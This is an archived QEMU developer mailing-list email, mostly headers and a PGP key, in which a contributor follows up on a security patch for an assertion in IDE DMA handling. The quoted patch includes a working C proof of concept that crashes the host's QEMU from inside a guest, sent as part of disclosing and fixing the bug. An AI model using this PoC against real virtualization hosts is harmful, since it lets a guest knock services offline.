Return-Path: <SRS0=EylP=Y6=nongnu.org=qemu-devel-bounces+qemu-devel=archiver.kernel.org@kernel.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
X-Spam-Level: 
X-Spam-Status: No, score=-8.2 required=3.0 tests=HEADER_FROM_DIFFERENT_DOMAINS,
	INCLUDES_PATCH,MAILING_LIST_MULTI,SIGNED_OFF_BY,SPF_HELO_NONE,SPF_PASS,
	URIBL_BLOCKED,USER_AGENT_SANE_1 autolearn=ham autolearn_force=no version=3.4.0
Received: from mail.kernel.org (mail.kernel.org [198.145.29.99])
	by smtp.lore.kernel.org (Postfix) with ESMTP id 5FB8AC5DF62
	for <qemu-devel@archiver.kernel.org>; Wed,  6 Nov 2019 10:19:06 +0000 (UTC)
Received: from lists.gnu.org (lists.gnu.org [209.51.188.17])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by mail.kernel.org (Postfix) with ESMTPS id 2DA4320869
	for <qemu-devel@archiver.kernel.org>; Wed,  6 Nov 2019 10:19:06 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.3.2 mail.kernel.org 2DA4320869
Authentication-Results: mail.kernel.org; dmarc=none (p=none dis=none) header.from=linux.com
Authentication-Results: mail.kernel.org; spf=pass smtp.mailfrom=qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org
Received: from localhost ([::1]:54934 helo=lists1p.gnu.org)
	by lists.gnu.org with esmtp (Exim 4.90_1)
	(envelope-from <qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org>)
	id 1iSIP3-0001DD-EC
	for qemu-devel@archiver.kernel.org; Wed, 06 Nov 2019 05:19:05 -0500
Received: from eggs.gnu.org ([2001:470:142:3::10]:41398)
 by lists.gnu.org with esmtp (Exim 4.90_1)
 (envelope-from <a13xp0p0v88@gmail.com>) id 1iSIO1-0000aq-3p
 for qemu-devel@nongnu.org; Wed, 06 Nov 2019 05:18:02 -0500
Received: from Debian-exim by eggs.gnu.org with spam-scanned (Exim 4.71)
 (envelope-from <a13xp0p0v88@gmail.com>) id 1iSINz-0004Aw-PR
 for qemu-devel@nongnu.org; Wed, 06 Nov 2019 05:18:01 -0500
Received: from mail-lj1-f195.google.com ([209.85.208.195]:38752)
 by eggs.gnu.org with esmtps (TLS1.0:RSA_AES_128_CBC_SHA1:16)
 (Exim 4.71) (envelope-from <a13xp0p0v88@gmail.com>)
 id 1iSINw-00049k-JC; Wed, 06 Nov 2019 05:17:56 -0500
Received: by mail-lj1-f195.google.com with SMTP id v8so9765856ljh.5;
 Wed, 06 Nov 2019 02:17:56 -0800 (PST)
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=1e100.net; s=20161025;
 h=x-gm-message-state:reply-to:subject:to:references:from:autocrypt
 :message-id:date:user-agent:mime-version:in-reply-to
 :content-language:content-transfer-encoding;
 bh=/DcHHFRu57Ezp/Dmyz+3naGkAEg+o3RIeJFoI6wQKkA=;
 b=L7PLHi4rGQ9TH0Zm1CtElQvWOD3o8Khpokwdc1Gha0glUoHuX57SUOpOGGCZBJZe2p
 sN/urm+AguIb80d+hhZXADnd4jN13S6VAvmMywUtgrr+oj06P/K8oGoga3uYpjj40YxI
 k9hS3W/3O9jMzHqIoq8EZpSSPXR27D6AfS5P6QIKPIHrMsn6cGEoHwnA3ol+6czbyZ1z
 ySvhCrWYM/jjPO2hxES/qRFiLLtKC34LutaMl4ImxxRxvQhLkVzdO29jLzVBBxlkJVbH
 u92p+8299C1Aw8vvXsVyRu9AUb1OuGk6H12bYp4p9Bb1BkGrq61k1HN2s+hsboUF+Zzw
 2BmA==
X-Gm-Message-State: APjAAAUSm0xJHSZqOnTSmGMqsVjhEV/thDbVG2jnZ0Xxo2/iWpMZnG4+
 L2dPpoogFJjTSHyHdq7rdcs=
X-Google-Smtp-Source: APXvYqwJHty3orCNgymelVTo7var7pJplis8B1hWaOaD5GuZRWdbQaCBBcaN00NekeyxH8KHE6OHHA==
X-Received: by 2002:a2e:7c12:: with SMTP id x18mr1346818ljc.130.1573035475151; 
 Wed, 06 Nov 2019 02:17:55 -0800 (PST)
Received: from [192.168.42.234] ([213.87.147.238])
 by smtp.gmail.com with ESMTPSA id i128sm12595427lfd.6.2019.11.06.02.17.52
 (version=TLS1_3 cipher=TLS_AES_128_GCM_SHA256 bits=128/128);
 Wed, 06 Nov 2019 02:17:53 -0800 (PST)
Subject: Re: [QEMU-SECURITY] ide: fix assertion in ide_dma_cb() to prevent
 qemu DoS from quest
To: John Snow <jsnow@redhat.com>, qemu-block@nongnu.org,
 qemu-devel@nongnu.org, qemu-stable@nongnu.org, mst@redhat.com,
 pmatouse@redhat.com, sstabellini@kernel.org, mdroth@linux.vnet.ibm.com,
 pjp@redhat.com, Paolo Bonzini <pbonzini@redhat.com>,
 David Woodhouse <David.Woodhouse@intel.com>,
 Andrea Arcangeli <aarcange@redhat.com>,
 Kashyap Chamarthy <kashyap.cv@gmail.com>
References: <1562335669-10127-1-git-send-email-alex.popov@linux.com>
From: Alexander Popov <alex.popov@linux.com>
Autocrypt: addr=alex.popov@linux.com; prefer-encrypt=mutual; keydata=
 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
 j3lCqPk=
Message-ID: <d748c840-56b7-6dcd-c82d-fea0a4949e8d@linux.com>
Date: Wed, 6 Nov 2019 13:17:51 +0300
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101
 Thunderbird/68.1.1
MIME-Version: 1.0
In-Reply-To: <1562335669-10127-1-git-send-email-alex.popov@linux.com>
Content-Type: text/plain; charset=utf-8
Content-Language: en-US
Content-Transfer-Encoding: 7bit
X-detected-operating-system: by eggs.gnu.org: GNU/Linux 2.2.x-3.x [generic]
 [fuzzy]
X-Received-From: 209.85.208.195
X-BeenThere: qemu-devel@nongnu.org
X-Mailman-Version: 2.1.23
Precedence: list
List-Id: <qemu-devel.nongnu.org>
List-Unsubscribe: <https://lists.nongnu.org/mailman/options/qemu-devel>,
 <mailto:qemu-devel-request@nongnu.org?subject=unsubscribe>
List-Archive: <https://lists.nongnu.org/archive/html/qemu-devel>
List-Post: <mailto:qemu-devel@nongnu.org>
List-Help: <mailto:qemu-devel-request@nongnu.org?subject=help>
List-Subscribe: <https://lists.nongnu.org/mailman/listinfo/qemu-devel>,
 <mailto:qemu-devel-request@nongnu.org?subject=subscribe>
Reply-To: alex.popov@linux.com
Errors-To: qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org
Sender: "Qemu-devel"
 <qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org>

On 27.07.2019 00:09, Alexander Popov wrote:
> On 26.07.2019 2:25:03 GMT+02:00, John Snow <jsnow@redhat.com> wrote:
>> Oh, this is fun.
> ...
>> I can worry about a proper fix for 4.2+.
>
> Hello John,
>
> Thanks for your letter.
>
> I double-checked the git history and mailing list, I'm still sure
> that my fix for this assertion is correct.

Hello!

I'm pointing politely to this issue again.

It crashes qemu during syzkaller fuzzing.

It's really annoying to manually apply the fix against it to qemu.

I'm quoting my patch from July that _correctly_ fixes the wrong assertion
introduced in the commit a718978ed58a.

Why don't you apply my commit and then do the refactoring later when you want?

Best regards,
Alexander


On 05.07.2019 17:07, Alexander Popov wrote:
> This assertion was introduced in the commit a718978ed58a in July 2015.
> It implies that the size of successful DMA transfers handled in
> ide_dma_cb() should be multiple of 512 (the size of a sector).
> 
> But guest systems can initiate DMA transfers that don't fit this
> requirement. Let's improve the assertion to prevent qemu DoS from quests.
> 
> PoC for Linux that uses SCSI_IOCTL_SEND_COMMAND to perform such an ATA
> command and crash qemu:
> 
> #include <stdio.h>
> #include <sys/ioctl.h>
> #include <stdint.h>
> #include <sys/types.h>
> #include <sys/stat.h>
> #include <fcntl.h>
> #include <string.h>
> #include <stdlib.h>
> #include <scsi/scsi.h>
> #include <scsi/scsi_ioctl.h>
> 
> #define CMD_SIZE 2048
> 
> struct scsi_ioctl_cmd_6 {
> 	unsigned int inlen;
> 	unsigned int outlen;
> 	unsigned char cmd[6];
> 	unsigned char data[];
> };
> 
> int main(void)
> {
> 	intptr_t fd = 0;
> 	struct scsi_ioctl_cmd_6 *cmd = NULL;
> 
> 	cmd = malloc(CMD_SIZE);
> 	if (!cmd) {
> 		perror("[-] malloc");
> 		return 1;
> 	}
> 
> 	memset(cmd, 0, CMD_SIZE);
> 	cmd->inlen = 1337;
> 	cmd->cmd[0] = READ_6;
> 
> 	fd = open("/dev/sg0", O_RDONLY);
> 	if (fd == -1) {
> 		perror("[-] opening sg");
> 		return 1;
> 	}
> 
> 	printf("[+] sg0 is opened\n");
> 
> 	printf("[.] qemu should break here:\n");
> 	fflush(stdout);
> 	ioctl(fd, SCSI_IOCTL_SEND_COMMAND, cmd);
> 	printf("[-] qemu didn't break\n");
> 
> 	free(cmd);
> 
> 	return 1;
> }
> 
> Signed-off-by: Alexander Popov <alex.popov@linux.com>
> ---
>  hw/ide/core.c | 2 +-
>  1 file changed, 1 insertion(+), 1 deletion(-)
> 
> diff --git a/hw/ide/core.c b/hw/ide/core.c
> index 6afadf8..304fe69 100644
> --- a/hw/ide/core.c
> +++ b/hw/ide/core.c
> @@ -868,7 +868,7 @@ static void ide_dma_cb(void *opaque, int ret)
>  
>      sector_num = ide_get_sector(s);
>      if (n > 0) {
> -        assert(n * 512 == s->sg.size);
> +        assert(n == s->sg.size / 512);
>          dma_buf_commit(s, s->sg.size);
>          sector_num += n;
>          ide_set_sector(s, sector_num);

